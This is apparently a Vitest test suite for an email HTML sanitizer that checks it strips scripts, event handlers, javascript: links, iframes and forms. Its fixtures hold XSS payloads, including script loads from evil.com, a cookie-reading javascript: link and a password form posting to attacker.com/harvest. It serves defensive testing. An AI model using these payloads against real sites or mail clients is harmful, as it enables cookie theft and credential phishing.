import { describe, it, expect } from 'vitest';
import { sanitizeEmailHtml, escapeHtml } from '@/lib/security/sanitize';

describe('HTML Sanitization & Email Security', () => {
  it('strips <script> tags and executable JavaScript', () => {
    const malicious = `
      <div>
        <p>Legitimate meeting notice</p>
        <script>alert('XSS Attack');</script>
        <script src="https://evil.com/payload.js"></script>
      </div>
    `;
    const clean = sanitizeEmailHtml(malicious);
    expect(clean).not.toContain('<script');
    expect(clean).not.toContain('alert(');
    expect(clean).not.toContain('evil.com');
    expect(clean).toContain('Legitimate meeting notice');
  });

  it('removes inline event handlers like onerror, onload, onclick', () => {
    const payload = `
      <img src="invalid.jpg" onerror="alert('pwned')" />
      <body onload="doEvil()">
      <a href="https://example.com" onclick="stealData()">Click here</a>
    `;
    const clean = sanitizeEmailHtml(payload);
    expect(clean).not.toContain('onerror');
    expect(clean).not.toContain('onload');
    expect(clean).not.toContain('onclick');
    expect(clean).not.toContain('alert(');
    expect(clean).not.toContain('stealData()');
  });

  it('neutralizes javascript: pseudo-protocol URIs in anchors', () => {
    const maliciousLink = '<a href="javascript:alert(document.cookie)">Verify Account</a>';
    const clean = sanitizeEmailHtml(maliciousLink);
    expect(clean).not.toContain('javascript:');
    expect(clean).not.toContain('alert(');
  });

  it('forbids dangerous embedding elements (iframe, object, embed, form)', () => {
    const dangerousHtml = `
      <iframe src="https://phishing.site"></iframe>
      <object data="malware.swf"></object>
      <embed src="exploit.pdf"></embed>
      <form action="https://attacker.com/harvest">
        <input type="password" name="pwd" />
        <button type="submit">Submit</button>
      </form>
    `;
    const clean = sanitizeEmailHtml(dangerousHtml);
    expect(clean).not.toContain('<iframe');
    expect(clean).not.toContain('<object');
    expect(clean).not.toContain('<embed');
    expect(clean).not.toContain('<form');
    expect(clean).not.toContain('<input');
    expect(clean).not.toContain('<button');
  });

  it('ensures legitimate hyperlinks open safely in a new tab with noopener', () => {
    const input = '<p>Visit <a href="https://contoso.com/portal">Contoso Portal</a></p>';
    const clean = sanitizeEmailHtml(input);
    expect(clean).toContain('target="_blank"');
    expect(clean).toContain('rel="noopener noreferrer"');
    expect(clean).toContain('href="https://contoso.com/portal"');
  });

  it('preserves clean table and email formatting markup', () => {
    const email = `
      <table style="width: 100%;">
        <tr>
          <td style="color: #0f6cbd; font-weight: bold;">Invoice #1024</td>
          <td>$500.00</td>
        </tr>
      </table>
    `;
    const clean = sanitizeEmailHtml(email);
    expect(clean).toContain('<table');
    expect(clean).toContain('Invoice #1024');
    expect(clean).toContain('$500.00');
  });

  it('escapes plain text safely', () => {
    const raw = 'John <john@example.com> & Jane';
    const escaped = escapeHtml(raw);
    expect(escaped).toBe('John &lt;john@example.com&gt; &amp; Jane');
  });
});

